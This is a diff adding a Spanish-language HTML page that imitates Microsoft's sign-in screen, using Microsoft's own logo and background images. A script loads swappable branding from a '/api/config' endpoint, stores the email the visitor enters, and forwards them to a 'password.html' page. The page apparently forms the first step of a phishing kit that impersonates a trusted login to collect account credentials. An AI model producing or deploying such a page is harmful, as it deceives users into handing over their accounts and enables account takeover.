@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Iniciar sesión</title>
+  <meta name="description" content="Iniciar sesión en su cuenta">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    html, body {
+      min-height: 100vh;
+      width: 100%;
+      overflow: hidden;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      background-color: #0a0a1a;
+    }
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+      background-image: url('https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg');
+    }
+    .login-container {
+      width: 100%;
+      max-width: 380px;
+      background: rgba(10, 10, 26, 0.85);
+      backdrop-filter: blur(20px);
+      border-radius: 12px;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
+      padding: 40px;
+      position: relative;
+      z-index: 10;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+    .logo img {
+      height: 40px;
+    }
+    .login-title {
+      font-size: 24px;
+      font-weight: 600;
+      color: #ffffff;
+      text-align: center;
+      margin-bottom: 8px;
+    }
+    .login-description {
+      font-size: 13px;
+      color: #a0a0b0;
+      text-align: center;
+      margin-bottom: 24px;
+      min-height: 18px;
+    }
+    .form-group {
+      margin-bottom: 20px;
+    }
+    label {
+      display: block;
+      font-size: 12px;
+      font-weight: 600;
+      color: #8c8c9e;
+      margin-bottom: 6px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    input[type="email"] {
+      width: 100%;
+      padding: 12px 14px;
+      background: rgba(0, 0, 0, 0.3);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      border-radius: 6px;
+      color: #ffffff;
+      font-size: 15px;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    input[type="email"]:focus {
+      border-color: #0078d4;
+    }
+    input[type="email"]::placeholder {
+      color: #6a6a7a;
+    }
+    /* Error box */
+    .error-box {
+      background: #fef2f2;
+      border: 1px solid #fca5a5;
+      border-radius: 4px;
+      padding: 8px 12px;
+      margin-bottom: 12px;
+      text-align: center;
+      display: none;
+    }
+    .error-text {
+      color: #dc2626;
+      font-size: 13px;
+      font-weight: 500;
+    }
+    .btn-primary {
+      width: 100%;
+      padding: 12px;
+      background: #0078d4;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .btn-primary:hover {
+      background: #106ebe;
+    }
+    .btn-primary:disabled {
+      background: #6a6a7a;
+      cursor: not-allowed;
+    }
+    .links {
+      margin-top: 16px;
+      text-align: center;
+    }
+    .links a {
+      color: #a0a0b0;
+      font-size: 13px;
+      text-decoration: none;
+    }
+    .links a:hover {
+      text-decoration: underline;
+    }
+    .footer {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 11px;
+      color: #6a6a7a;
+      line-height: 1.6;
+    }
+    .footer a {
+      color: #6a6a7a;
+      text-decoration: none;
+    }
+    .footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="logo">
+      <img id="loginLogo" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">
+    </div>
+    <div class="login-title" id="loginTitle">Iniciar sesión</div>
+    <div class="login-description" id="loginDescription"></div>
+
+    <form id="loginForm" onsubmit="return handleEmailSubmit(event)">
+      <div class="error-box" id="errorBox">
+        <span class="error-text" id="errorText"></span>
+      </div>
+
+      <div class="form-group">
+        <label for="emailInput">Correo electrónico, teléfono o Skype</label>
+        <input type="email" id="emailInput" name="loginfmt" autocomplete="username"
+               placeholder="Correo electrónico, teléfono o Skype"
+               aria-label="Correo electrónico, teléfono o Skype" required>
+      </div>
+    </form>
+
+    <button type="submit" id="nextButton" class="btn-primary" onclick="handleEmailSubmit(event)">
+      Siguiente
+    </button>
+
+    <div class="links">
+      <a href="#">¿No tiene una cuenta? Cree una</a>
+      <br><br>
+      <a href="#">¿No puede acceder a su cuenta?</a>
+    </div>
+
+    <div class="footer">
+      <a href="#">Ayuda</a>
+      ·
+      <a href="#">Términos de uso</a>
+      ·
+      <a href="#">Privacidad y cookies</a>
+      <br>
+      <span>Usa la exploración privada si este no es tu dispositivo. Más información</span>
+    </div>
+  </div>
+
+  <script>
+    // --- Cargar configuración desde el API ---
+    var savedSettings = {};
+
+    function getSavedSetting(key, defaultValue) {
+      if (savedSettings[key] !== undefined && savedSettings[key] !== '') return savedSettings[key];
+      if (localStorage.getItem(key) !== null && localStorage.getItem(key) !== '') return localStorage.getItem(key);
+      return defaultValue;
+    }
+
+    async function loadConfig() {
+      try {
+        var res = await fetch('/api/config');
+        if (res.ok) {
+          var data = await res.json();
+          savedSettings = data;
+          // Guardar en localStorage como fallback
+          Object.keys(data).forEach(function(k) {
+            if (data[k] !== undefined && data[k] !== null && typeof data[k] !== 'object') {
+              localStorage.setItem(k, data[k]);
+            }
+          });
+        }
+      } catch (e) {
+        // Fallback: cargar desde localStorage
+        savedSettings = {};
+        for (var key in localStorage) {
+          if (localStorage.hasOwnProperty(key)) {
+            savedSettings[key] = localStorage.getItem(key);
+          }
+        }
+      }
+      applyLoginBackground();
+      applyLoginContent();
+    }
+
+    // --- Aplicar fondo de pantalla ---
+    function applyLoginBackground() {
+      var bgType = getSavedSetting('loginBgType', 'image');
+      var bgColor = getSavedSetting('loginBgColor', '#0a0a1a');
+      var bgGradient = getSavedSetting('loginBgGradient', 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)');
+      var bgImage = getSavedSetting('loginBgImage', 'https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg');
+
+      document.body.style.removeProperty('background-image');
+      document.body.style.removeProperty('background-color');
+      document.body.classList.remove('bg-gradient', 'bg-image');
+
+      if (bgType === 'gradient') {
+        document.body.style.background = bgGradient;
+        document.body.classList.add('bg-gradient');
+      } else if (bgType === 'image' && bgImage) {
+        document.body.style.backgroundImage = 'url(' + bgImage + ')';
+        document.body.style.backgroundSize = 'cover';
+        document.body.style.backgroundPosition = 'center';
+        document.body.style.backgroundRepeat = 'no-repeat';
+        document.body.classList.add('bg-image');
+      } else {
+        document.body.style.backgroundColor = bgColor;
+      }
+    }
+
+    // --- Aplicar contenido editable ---
+    function applyLoginContent() {
+      var logoUrl = getSavedSetting('loginLogo', 'https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg');
+      var title = getSavedSetting('loginTitle', 'Iniciar sesión');
+      var description = getSavedSetting('loginDescription', '');
+
+      var logoImg = document.getElementById('loginLogo');
+      if (logoImg) logoImg.src = logoUrl;
+
+      var titleEl = document.getElementById('loginTitle');
+      if (titleEl) titleEl.textContent = title;
+
+      var descEl = document.getElementById('loginDescription');
+      if (descEl) {
+        descEl.textContent = description || '';
+        descEl.style.display = description ? 'block' : 'none';
+      }
+    }
+
+    // --- Manejo de errores ---
+    function showError(message) {
+      var box = document.getElementById('errorBox');
+      var text = document.getElementById('errorText');
+      if (box && text) {
+        text.textContent = message;
+        box.style.display = 'block';
+      }
+    }
+
+    function hideError() {
+      var box = document.getElementById('errorBox');
+      if (box) box.style.display = 'none';
+    }
+
+    // --- Validación y envío del email ---
+    function handleEmailSubmit(event) {
+      if (event) event.preventDefault();
+      hideError();
+
+      var email = document.getElementById('emailInput').value.trim();
+
+      // Limpiar el email (eliminar espacios extra)
+      email = email.replace(/\s+/g, ' ').trim();
+
+      if (!email || email === '') {
+        showError('Por favor, ingrese su correo electrónico, teléfono o Skype.');
+        return false;
+      }
+
+      // Validación básica de email
+      var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      var phoneRegex = /^[\+]?[0-9\s\-\(\)]{7,}$/;
+
+      if (!emailRegex.test(email) && !phoneRegex.test(email)) {
+        showError('Ingrese una dirección de correo electrónico, teléfono o Skype válida.');
+        return false;
+      }
+
+      // Guardar email en sessionStorage para la siguiente página
+      sessionStorage.setItem('loginEmail', email);
+      // También en localStorage para fallback
+      localStorage.setItem('loginEmail', email);
+
+      // Navegar a la página de contraseña
+      window.location.href = 'password.html';
+      return false;
+    }
+
+    // Cargar configuración al iniciar
+    document.addEventListener('DOMContentLoaded', function() {
+      loadConfig();
+      // Auto-enfocar el input de email
+      var emailInput = document.getElementById('emailInput');
+      if (emailInput) emailInput.focus();
+    });
+  </script>
+</body>
+</html>
